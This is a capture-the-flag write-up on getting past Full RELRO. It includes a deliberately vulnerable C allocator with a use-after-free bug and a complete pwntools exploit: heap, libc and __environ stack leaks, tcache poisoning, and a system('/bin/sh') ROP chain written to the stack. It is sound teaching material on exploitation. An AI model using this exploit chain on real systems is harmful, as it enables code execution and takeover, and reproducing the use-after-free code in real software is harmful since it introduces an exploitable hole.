---
title: "Pwn - Full RELRO Bypass"
description: "Exploiting binaries with Full RELRO enabled — when the GOT is read-only, find alternative write targets using libc environ, FILE structures, and stack-based attacks."
author: "Zemi"
---

## Challenge Info

| Detail     | Value                                         |
|------------|-----------------------------------------------|
| Category   | Binary Exploitation                           |
| Difficulty | Extreme                                       |
| Points     | 600                                           |
| Flag       | `zemi{full_r3lr0_n0_g0t_n0_pr0bl3m}`         |

## Challenge Files

Download the challenge files to get started:

- [fullrelro.c](/Website/challenges/pwn-full-relro-bypass/fullrelro.c)
- [Makefile](/Website/challenges/pwn-full-relro-bypass/Makefile)
- [flag.txt](/Website/challenges/pwn-full-relro-bypass/flag.txt)

## Prerequisites

Before attempting this challenge, you should have completed:

- **Pwn - Buffer Overflow** — stack exploitation fundamentals
- **Pwn - ret2libc** — understanding GOT/PLT and libc function calls
- **Pwn - ROP Chains** — building multi-gadget ROP chains
- **Pwn - Heap Overflow** — heap chunk layout and metadata
- **Pwn - Tcache Poisoning** — modern heap exploitation and arbitrary write
- **Pwn - Stack Pivot** — redirecting RSP to controlled memory

This is the culmination of every technique taught so far. You need a deep understanding of ELF internals, libc data structures, and the relationship between stack, heap, and library memory.

## Introduction

In every exploitation challenge up to this point, we have relied on one crucial assumption: **the GOT (Global Offset Table) is writable**. With Partial RELRO, the GOT resides in a writable memory page. We overwrite a GOT entry, and the next call to that function goes wherever we want.

**Full RELRO** destroys this assumption. The dynamic linker resolves ALL GOT entries at program startup, then marks the entire GOT as **read-only** using `mprotect()`. Any attempt to write to the GOT causes a segmentation fault.

```bash
$ checksec --file=challenge
    RELRO:    Full RELRO      <-- GOT is read-only!
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Every protection is on. GOT is locked. Stack canaries are present. The stack is non-executable. Addresses are randomized. This is the hardest configuration to exploit.

But it is not impossible. When one door closes, others remain open. This writeup teaches you where to look.

## What RELRO Actually Does

### Partial RELRO (Default)

- `.got` section (for global variables) is read-only
- `.got.plt` section (for function pointers) is **writable**
- Functions are resolved lazily (on first call)
- The GOT is writable for the entire program lifetime

### Full RELRO

- ALL GOT sections are read-only
- Functions are resolved eagerly at startup (no lazy binding)
- `ld.so` calls `mprotect()` to make the GOT pages non-writable after resolution
- Any write to the GOT triggers SIGSEGV

```
ELF Memory Map with Full RELRO:

+------------------+ Low addresses
| .text            | R-X (code, executable)
+------------------+
| .rodata          | R-- (constants, read-only)
+------------------+
| .got             | R-- (resolved, READ-ONLY!)
| .got.plt         | R-- (resolved, READ-ONLY!)
+------------------+
| .data            | RW- (writable globals)
+------------------+
| .bss             | RW- (uninitialized globals)
+------------------+
| heap             | RW- (dynamic allocations)
+------------------+
|                  |
| ...              |
|                  |
+------------------+
| stack            | RW- (local variables)
+------------------+ High addresses
```

The GOT is mapped read-only. Writing to it is impossible without first calling `mprotect()` to change the permissions — which requires code execution that we are trying to achieve in the first place. A circular dependency.

## Alternative Write Targets

When the GOT is off-limits, we need other writable locations that influence control flow. Here are the main targets, ordered by practicality:

### 1. Return Addresses on the Stack

The stack is always writable. If we can find the address of a return address on the stack, we can overwrite it with a ROP chain. The challenge: ASLR randomizes the stack address. We need a leak.

**The key: `environ` pointer in libc.**

The libc symbol `__environ` (or `environ`) contains a pointer to the environment variables on the stack. If we can read this pointer, we know a stack address. From there, we can calculate the offset to any return address.

```
libc's environ pointer -> stack address (envp)
stack address - offset -> saved return address of target function
```

### 2. __free_hook / __malloc_hook (glibc < 2.34)

These are writable function pointers in libc that get called on every `free()` / `malloc()`. Overwriting them redirects execution. However, they were **removed in glibc 2.34** (released August 2021). On modern systems, these no longer exist.

### 3. __libc_atexit / exit Function Handlers

The `atexit()` mechanism registers functions to be called when the program exits. The function list is stored in a writable structure. Corrupting it can redirect execution during `exit()`.

### 4. FILE Structure Exploitation

The standard I/O streams (`stdin`, `stdout`, `stderr`) are `FILE` structures (type `_IO_FILE`) in libc. These structures contain function pointer tables (vtables). Corrupting a FILE structure can redirect I/O operations to arbitrary code.

### 5. Thread-Local Storage (TLS) / Stack Guard

The stack canary value is stored in the TLS. If you can overwrite it, you can "know" the canary and bypass stack protection. The `fs` segment register points to the TLS.

## Vulnerable Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Compiled: gcc -fstack-protector-all -pie -fPIE -Wl,-z,relro,-z,now -o fullrelro fullrelro.c
// Full RELRO + PIE + NX + Stack canary + ASLR

struct entry {
    char *ptr;
    size_t size;
};

struct entry entries[16];
int count = 0;

void setup() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void alloc_entry() {
    if (count >= 16) { puts("Full!"); return; }
    size_t sz;
    printf("Size: ");
    scanf("%lu", &sz);
    if (sz > 0x1000) { puts("Too big!"); return; }
    entries[count].ptr = malloc(sz);
    entries[count].size = sz;
    printf("Data: ");
    read(0, entries[count].ptr, sz);
    printf("Index: %d\n", count);
    count++;
}

void free_entry() {
    int idx;
    printf("Index: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= count || !entries[idx].ptr) {
        puts("Invalid!"); return;
    }
    free(entries[idx].ptr);
    // BUG: UAF — pointer not nulled
}

void edit_entry() {
    int idx;
    printf("Index: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= count || !entries[idx].ptr) {
        puts("Invalid!"); return;
    }
    printf("Data: ");
    read(0, entries[idx].ptr, entries[idx].size);
}

void view_entry() {
    int idx;
    printf("Index: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= count || !entries[idx].ptr) {
        puts("Invalid!"); return;
    }
    printf("Data: ");
    write(1, entries[idx].ptr, entries[idx].size);
    putchar('\n');
}

void menu_loop() {
    while (1) {
        printf("\n1)Alloc 2)Free 3)Edit 4)View 5)Exit\n> ");
        int c;
        scanf("%d", &c);
        switch (c) {
            case 1: alloc_entry(); break;
            case 2: free_entry(); break;
            case 3: edit_entry(); break;
            case 4: view_entry(); break;
            case 5: return;
            default: puts("?");
        }
    }
}

int main() {
    setup();
    puts("Welcome to the secure allocator!");
    menu_loop();
    puts("Goodbye!");
    return 0;
}
```

### Compilation

```bash
gcc -fstack-protector-all -pie -fPIE -Wl,-z,relro,-z,now -o fullrelro fullrelro.c
```

### Protection Verification

```bash
$ checksec --file=fullrelro
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled (0x5555555546a0)
```

Everything is on. This is as hardened as a standard userspace binary gets.

### The Bug

Same as the tcache challenge: **Use-After-Free**. `free_entry()` does not null the pointer. `edit_entry()` and `view_entry()` can access freed chunks.

But this time, we cannot overwrite the GOT. We need a different path.

## Exploitation Strategy

Our attack plan has four phases:

```
Phase 1: Leak heap address (via UAF read of tcache fd pointer)
Phase 2: Leak libc address (via unsorted bin fd/bk pointer)
Phase 3: Leak stack address (via libc environ pointer)
Phase 4: Write ROP chain to stack (via arbitrary write to return address)
```

Each phase builds on the previous one. By the end, we have a ROP chain on the stack that calls `execve("/bin/sh", 0, 0)` or `system("/bin/sh")`.

### Phase 1: Leak the Heap Address

Free a tcache chunk and read its `fd` pointer via UAF. On glibc 2.32+, the pointer is encrypted with safe-linking, but the first chunk in a bin has `next = NULL`, so the encrypted value is `0 XOR (chunk_addr >> 12) = chunk_addr >> 12`. This gives us the heap address.

```
Free chunk A (first in bin):
  A->next = encrypt(NULL) = 0 ^ (A >> 12) = A >> 12

Read A via UAF:
  leaked = A >> 12
  heap_page = leaked << 12   (approximate heap base)
```

### Phase 2: Leak the Libc Address

To get a libc pointer on the heap, we need a chunk in the **unsorted bin**. Tcache only holds 7 chunks per size. If we free 8 chunks of the same size, the 8th goes to the unsorted bin (or we can use a large chunk that bypasses tcache entirely).

Unsorted bin chunks have `fd` and `bk` pointers that point into `main_arena` in libc. Reading these via UAF leaks a libc address.

```
Free 8 chunks of size 0x90 (or free one large chunk > 0x410):
  Chunk 8 goes to unsorted bin
  Chunk 8->fd = &main_arena.top (libc address)

Read chunk 8 via UAF:
  leaked_libc = main_arena + offset
  libc_base = leaked_libc - known_offset
```

Actually, for cleaner exploitation, we can allocate and free a chunk larger than the tcache maximum (0x410 bytes). This goes directly to the unsorted bin.

### Phase 3: Leak the Stack Address

With the libc base known, we can calculate the address of `__environ`:

```python
environ_ptr = libc_base + libc.symbols['__environ']
# or equivalently:
environ_ptr = libc_base + libc.symbols['environ']
```

The `__environ` symbol in libc contains a pointer to the `envp` array on the stack. If we can **read from this address**, we get a stack address.

How do we read from an arbitrary address? Tcache poisoning. We poison a tcache freelist to make `malloc()` return a chunk overlapping `__environ`. Then we read it via `view_entry()`.

Wait, but with Full RELRO and PIE, we need to be more careful. The `__environ` address is in libc's writable data section, which is at a randomized address. We know the libc base from Phase 2, so we can calculate it.

```
Tcache poison: make malloc return a pointer near __environ
Read through the returned chunk to leak the stack pointer
stack_addr = *environ_ptr  (points to envp on the stack)
```

### Phase 4: Write ROP Chain to the Stack

Now we know a stack address. We calculate the offset from `envp` to a return address we want to overwrite. The target is typically the return address of `menu_loop()` or `main()` — when the function returns, our ROP chain executes.

We use another tcache poisoning to make `malloc()` return a pointer to the target return address on the stack. Then we write our ROP chain through it.

```
Calculate: target_ret_addr = stack_addr - offset_to_return_address
Tcache poison: make malloc return target_ret_addr
Write ROP chain through the returned chunk
Exit menu_loop() -> return address is our ROP chain -> shell
```

### Stack Layout and Offset Calculation

```
High addresses (stack grows down)
+------------------------+
| envp[0], envp[1], ...  |  <-- __environ points here
+------------------------+
| argv[0], argv[1], ...  |
+------------------------+
| argc                   |
+------------------------+
| __libc_start_main's    |
| saved RIP              |
+------------------------+
| main's saved RBP       |
+------------------------+
| main's saved RIP       |  <-- target (overwrite this)
+------------------------+
| main's local vars      |
+------------------------+
| menu_loop's saved RBP  |
+------------------------+
| menu_loop's saved RIP  |  <-- or target this one
+------------------------+
| menu_loop's locals     |
+------------------------+
| ...                    |
Low addresses
```

The exact offset from `envp` to the target return address depends on the binary and libc version. We determine it with GDB.

## GDB Walkthrough

### Finding the environ-to-return-address Offset

```bash
$ gdb -q ./fullrelro
gef> break menu_loop
gef> run

# Find __environ value:
gef> p/x __environ
$1 = (char **) 0x7fffffffe5f8

# Find menu_loop's return address location:
gef> info frame
Stack level 0, frame at 0x7fffffffe4e0:
 rip = 0x555555555370 in menu_loop; saved rip = 0x555555555420
 Saved registers:
  rbp at 0x7fffffffe4d0, rip at 0x7fffffffe4d8

# The return address of menu_loop is at 0x7fffffffe4d8
# __environ points to 0x7fffffffe5f8

# Offset = 0x7fffffffe5f8 - 0x7fffffffe4d8 = 0x120
# So: ret_addr_location = environ_value - 0x120
```

This offset (0x120) is specific to this binary and compilation. Always verify with GDB.

### Verifying the Leak Chain

```bash
# After Phase 2 (libc leak):
gef> p/x &__environ
$2 = 0x7ffff7fb4d60   # address of environ pointer in libc

gef> x/gx 0x7ffff7fb4d60
0x7ffff7fb4d60: 0x00007fffffffe5f8   # points to stack!

gef> x/gx 0x7fffffffe5f8
0x7fffffffe5f8: 0x00007fffffffe82a   # envp[0] — a stack address

# After Phase 3 (stack leak via reading __environ):
# We read from the chunk overlapping __environ
# The first 8 bytes are 0x7fffffffe5f8 — our stack address
```

### Verifying the ROP Chain

```bash
# After writing ROP chain to stack:
gef> x/10gx 0x7fffffffe4d8
0x7fffffffe4d8: 0x0000555555555263   <- pop rdi; ret (our ROP chain!)
0x7fffffffe4e0: 0x00007ffff7f7c882   <- &"/bin/sh" in libc
0x7fffffffe4e8: 0x00007ffff7e4fe50   <- system()
```

## Full Exploit

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./fullrelro')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # adjust as needed
context.binary = elf

p = process('./fullrelro')

def alloc(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)
    p.recvuntil(b'Index: ')
    return int(p.recvline().strip())

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

def view(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.recvuntil(b'Data: ')
    return p.recvuntil(b'\n', drop=True)

p.recvuntil(b'Welcome to the secure allocator!\n')

# ======================================================
# PHASE 1: Leak heap address via tcache UAF read
# ======================================================
log.info("Phase 1: Leaking heap address...")

# Allocate and free a chunk to read its safe-linked fd pointer
idx_heap = alloc(0x28, b'H' * 0x28)  # index 0
free(idx_heap)

# Read the freed chunk — on glibc 2.32+, fd is encrypted
# For the first chunk freed into a bin: encrypted = 0 ^ (addr >> 12)
leaked_raw = u64(view(idx_heap).ljust(8, b'\x00'))
# On older glibc (no safe-linking), this might be 0 (NULL next)
# On glibc 2.32+, this is addr >> 12

if leaked_raw == 0:
    log.info("No safe-linking detected (glibc < 2.32)")
    heap_known = False
else:
    heap_page = leaked_raw << 12
    log.success(f"Heap page (approx): {hex(heap_page)}")
    heap_known = True

# ======================================================
# PHASE 2: Leak libc address via unsorted bin
# ======================================================
log.info("Phase 2: Leaking libc address...")

# Allocate a large chunk (> 0x410 to bypass tcache) and a guard chunk
idx_big = alloc(0x500, b'B' * 0x500)    # index 1
idx_guard = alloc(0x20, b'G' * 0x20)    # index 2 (prevents consolidation with top)

# Free the big chunk — goes to unsorted bin
free(idx_big)

# Read the freed chunk — fd and bk point into main_arena (libc)
leaked_unsorted = u64(view(idx_big)[:8].ljust(8, b'\x00'))
log.info(f"Leaked unsorted bin fd: {hex(leaked_unsorted)}")

# Calculate libc base
# The fd pointer points to main_arena+96 (or similar offset depending on glibc)
# This offset is: &main_arena.top or &main_arena.bins[0]
# For glibc 2.31-2.35: unsorted bin fd = main_arena + 96
main_arena_offset = libc.symbols.get('main_arena', 0)
if main_arena_offset == 0:
    # main_arena is not exported in some libc builds
    # Use: leaked - 96 - (offset of main_arena from libc base)
    # Alternative: leaked points to &(main_arena.bins[0]) = main_arena + 96
    # main_arena is typically at a known offset from __malloc_hook + 0x10
    # Let's use a heuristic:
    libc.address = leaked_unsorted - 0x1ecbe0  # adjust for your glibc version
else:
    libc.address = leaked_unsorted - main_arena_offset - 96

log.success(f"Libc base: {hex(libc.address)}")

# Verify the leak makes sense
assert libc.address & 0xfff == 0, "Libc base not page-aligned!"

# ======================================================
# PHASE 3: Leak stack address via libc environ
# ======================================================
log.info("Phase 3: Leaking stack address via __environ...")

environ_addr = libc.symbols['__environ']
log.info(f"__environ @ {hex(environ_addr)}")

# We need to make malloc return a pointer to environ_addr.
# Use tcache poisoning to corrupt a freelist.

# Allocate two chunks of the same size for tcache poisoning
idx_a = alloc(0x80, b'A' * 0x80)    # index 3
idx_b = alloc(0x80, b'B' * 0x80)    # index 4

# Free both (LIFO: b freed first, then a => HEAD -> a -> b)
free(idx_b)
free(idx_a)

# Read chunk a's fd to get its address (for safe-linking on 2.32+)
leaked_a_fd = u64(view(idx_a)[:8].ljust(8, b'\x00'))
if heap_known:
    # Safe-linking: decrypt to find chunk_b address
    chunk_a_addr_approx = heap_page  # rough, might need adjustment
    # Actually we need the address of chunk a itself for decryption
    # fd_encrypted = next ^ (self >> 12)
    # For our purposes, let's use the raw value and XOR to set our target
    mask = leaked_a_fd ^ 0  # if we knew next was some value...
    # Simpler approach: use the heap_page we leaked earlier
    mask = heap_page >> 12  # approximate mask (top bits match)
    real_fd = leaked_a_fd ^ mask
    log.info(f"Decrypted fd of chunk a: {hex(real_fd)} (-> chunk b)")

    # Encrypt our target address
    encrypted_target = environ_addr ^ mask
    log.info(f"Encrypted __environ target: {hex(encrypted_target)}")
    edit(idx_a, p64(encrypted_target) + p64(0))
else:
    # No safe-linking — write raw address
    edit(idx_a, p64(environ_addr) + p64(0))

# First malloc returns chunk a
idx_c = alloc(0x80, b'C' * 0x80)    # index 5 — gets chunk a

# Second malloc returns __environ!
idx_env = alloc(0x80, b'\x00' * 0x80)  # index 6 — gets __environ
# Now view this chunk to read the stack pointer
stack_leak = u64(view(idx_env)[:8].ljust(8, b'\x00'))
log.success(f"Stack leak (environ value): {hex(stack_leak)}")

# ======================================================
# PHASE 4: Calculate return address and write ROP chain
# ======================================================
log.info("Phase 4: Writing ROP chain to stack...")

# The offset from environ value to menu_loop's return address
# This is determined via GDB (see walkthrough above)
# Typical value is around 0x100-0x150, adjust for your binary
ENVIRON_TO_RET_OFFSET = 0x120  # ADJUST THIS WITH GDB

target_ret = stack_leak - ENVIRON_TO_RET_OFFSET
log.info(f"Target return address location: {hex(target_ret)}")

# Build ROP chain
# We need: pop rdi; ret | &"/bin/sh" | ret (alignment) | system
pop_rdi = libc.address + next(libc.search(asm('pop rdi; ret')))
ret = pop_rdi + 1  # ret gadget for alignment
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

rop_chain  = p64(ret)        # stack alignment
rop_chain += p64(pop_rdi)    # pop rdi; ret
rop_chain += p64(bin_sh)     # "/bin/sh"
rop_chain += p64(system)     # system("/bin/sh")

log.info(f"ROP chain: ret={hex(ret)}, pop_rdi={hex(pop_rdi)}, "
         f"binsh={hex(bin_sh)}, system={hex(system)}")

# Tcache poison again to write to the stack
idx_d = alloc(0x60, b'D' * 0x60)    # index 7
idx_e = alloc(0x60, b'E' * 0x60)    # index 8

free(idx_e)
free(idx_d)

# Poison chunk d's fd to point to target_ret
if heap_known:
    encrypted_stack = target_ret ^ mask
    edit(idx_d, p64(encrypted_stack) + p64(0))
else:
    edit(idx_d, p64(target_ret) + p64(0))

# First malloc returns chunk d
idx_f = alloc(0x60, b'F' * 0x60)    # index 9

# Second malloc returns our stack target!
idx_stack = alloc(0x60, rop_chain.ljust(0x60, b'\x00'))  # index 10
# The ROP chain is now written to menu_loop's return address on the stack

# ======================================================
# Trigger: exit menu_loop, ROP chain executes
# ======================================================
log.info("Triggering ROP chain by exiting menu_loop...")
p.sendlineafter(b'> ', b'5')  # exit menu_loop -> returns to our ROP chain

log.success("Shell incoming!")
p.interactive()
```

### Running the Exploit

```bash
$ python3 exploit.py
[*] '/home/user/fullrelro'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Phase 1: Leaking heap address...
[+] Heap page (approx): 0x555555559000
[*] Phase 2: Leaking libc address...
[*] Leaked unsorted bin fd: 0x7ffff7facbe0
[+] Libc base: 0x7ffff7dc0000
[*] Phase 3: Leaking stack address via __environ...
[*] __environ @ 0x7ffff7fb4d60
[+] Stack leak (environ value): 0x7fffffffe5f8
[*] Phase 4: Writing ROP chain to stack...
[*] Target return address location: 0x7fffffffe4d8
[*] Triggering ROP chain by exiting menu_loop...
[+] Shell incoming!
[*] Switching to interactive mode
$ cat flag.txt
zemi{full_r3lr0_n0_g0t_n0_pr0bl3m}
```

## Alternative Technique: _IO_FILE Exploitation

When you cannot write to the stack (maybe you do not have a stack leak, or the canary blocks you), FILE structure exploitation is another path.

### How It Works

The standard streams (`_IO_2_1_stdin_`, `_IO_2_1_stdout_`, `_IO_2_1_stderr_`) are FILE structures in libc's writable data. Each FILE has a vtable pointer that references a table of function pointers (like `__overflow`, `__finish`, etc.).

If we corrupt the FILE structure or its vtable, we can redirect I/O operations to arbitrary code.

### _IO_2_1_stdout_ Leak Technique

Even without a UAF read, we can leak libc by partially overwriting the `_IO_2_1_stdout_` structure. The `_IO_write_base` field controls where `write()` starts reading from. By lowering it, we can make `stdout` output bytes from earlier in its buffer, potentially leaking addresses.

```
Normal stdout:
  _IO_write_base = 0x7ffff7fad700   (start of write buffer)
  _IO_write_ptr  = 0x7ffff7fad700   (current position = base, buffer empty)

After corruption (lower write_base by partial overwrite):
  _IO_write_base = 0x7ffff7fad000   (earlier in memory!)
  _IO_write_ptr  = 0x7ffff7fad700   (unchanged)

Next time stdout flushes, it writes bytes from 0x7ffff7fad000 to 0x7ffff7fad700,
which may contain libc pointers!
```

### FILE Vtable Hijack (glibc < 2.24)

On older glibc (before 2.24), we could overwrite the vtable pointer to point to a fake vtable containing our function pointers. On glibc 2.24+, vtable pointers are validated to point within a specific memory region (`__libc_IO_vtables`), so direct vtable hijacking is blocked.

### Modern Alternative: __malloc_assert Path

On some glibc versions, triggering an assertion inside malloc (by corrupting the top chunk size) calls `__fxprintf`, which uses `stderr`'s FILE structure. If we've corrupted `stderr`, this can give us code execution through the FSOP (File Stream Oriented Programming) chain.

## Common Pitfalls

### 1. Stack Canary

Full RELRO binaries usually have stack canaries too. If you are writing a ROP chain to the stack, you must write PAST the canary (to the return address) without corrupting the canary itself. Since our tcache poisoning gives us a pointer directly to the return address (not the start of the stack frame), we bypass the canary entirely — we never touch it.

```
Stack frame:
  [local vars]
  [canary]       <- we do NOT write here
  [saved RBP]    <- we might overwrite this (usually fine)
  [saved RIP]    <- our ROP chain starts here (tcache gives us this addr)
```

### 2. environ Offset Varies

The offset from `*environ` to the target return address depends on:
- The binary (how many stack frames are between main and the target)
- The libc version (main's call chain differs between glibc versions)
- The environment variables (more vars = higher envp address)

Always determine this offset with GDB on the target system. Do NOT assume the offset from one system works on another.

### 3. Alignment for Tcache Poisoning

On glibc 2.32+ with safe-linking, `malloc` checks alignment:

```c
if (__glibc_unlikely(!aligned_OK(e))) {
    malloc_printerr("malloc(): unaligned tcache chunk detected");
}
```

The stack address you target must be 16-byte aligned. If the return address is not aligned, adjust to the nearest aligned address and pad your ROP chain accordingly.

### 4. Multiple Leaks Required

This exploit requires three separate leaks:
1. Heap address (for safe-linking bypass)
2. Libc address (for gadgets and environ)
3. Stack address (for the write target)

Each leak requires careful heap manipulation. Take your time and verify each leak with GDB before moving to the next phase.

### 5. Heap State Management

After many allocations and frees, the heap state can become unpredictable. Keep track of every allocation and free. Use a consistent chunk size for each phase to avoid tcache bin confusion. Allocate guard chunks to prevent consolidation.

## Comparison: Partial RELRO vs. Full RELRO Exploitation

| Aspect              | Partial RELRO                    | Full RELRO                         |
|---------------------|----------------------------------|------------------------------------|
| GOT writable?       | Yes                              | No                                 |
| Typical target      | GOT entry                       | Stack return address               |
| Leaks needed        | 1 (libc)                        | 3 (heap + libc + stack)            |
| Arbitrary write uses| 1 (overwrite GOT)               | 2 (leak environ, write stack)      |
| Complexity          | Medium                           | High                               |
| Reliability         | Very reliable                    | Offset-dependent                   |

## Tools Used

| Tool          | Purpose                                            |
|---------------|---------------------------------------------------|
| GCC           | Compile with full protections                      |
| checksec      | Verify all protections are enabled                 |
| GDB + GEF     | Find offsets, verify leaks, trace execution        |
| pwntools      | Build and send the multi-phase exploit             |
| readelf       | Examine ELF sections and RELRO status              |
| objdump       | Disassemble and find gadgets                       |
| ROPgadget     | Find ROP gadgets in libc                           |
| one_gadget    | Find one-shot execve gadgets in libc (alternative) |
| patchelf      | Test against different glibc versions               |

## Lessons Learned

1. **Full RELRO is not full protection.** It removes one target (GOT) but the stack, heap, and libc data structures remain writable. As long as there are writable function pointers or return addresses, exploitation is possible.

2. **The libc `environ` pointer is the bridge to the stack.** When ASLR hides the stack, `environ` gives it away. This is perhaps the most important primitive in modern Linux exploitation: leak libc, read environ, get stack.

3. **Multi-phase exploitation is the norm at this level.** Real-world exploitation rarely involves one trick. You chain leaks and writes across different memory regions, each building on the previous one.

4. **Heap manipulation is surgical.** At this difficulty level, every allocation and free matters. You need a mental model (or a drawn diagram) of the heap state at every step.

5. **GDB is not optional.** The exact offsets between `environ` and your target return address, the safe-linking mask, the unsorted bin fd offset — all of these are determined empirically with GDB. There is no shortcut.

6. **Protections add complexity, not impossibility.** Full RELRO, PIE, ASLR, NX, and canaries together make exploitation hard but not impossible. Each protection closes one avenue; the exploit finds another. Understanding this cat-and-mouse game is what separates intermediate from advanced exploit developers.

7. **Every readable pointer is a potential leak. Every writable pointer is a potential weapon.** The UAF gives us both. The only question is what to read and where to write. With the right targets (environ for reads, stack for writes), we bypass every protection on the binary.
